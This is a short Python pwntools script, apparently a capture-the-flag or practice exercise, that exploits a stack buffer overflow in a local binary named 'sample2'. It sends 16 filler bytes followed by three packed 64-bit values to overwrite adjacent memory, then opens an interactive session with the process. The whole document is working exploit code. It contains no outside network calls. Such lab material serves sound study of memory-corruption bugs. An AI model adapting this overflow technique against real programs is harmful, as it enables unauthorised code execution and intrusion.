#!/usr/bin/python3

from pwn import *

context.binary = elf = ELF("./sample2", checksec = False)
con = process()

payload = b"A" * 16 + p64(0xcafebabe) + p64(0xdeadbeef) + p64(0x13371337)

con.sendline(payload)
con.interactive()
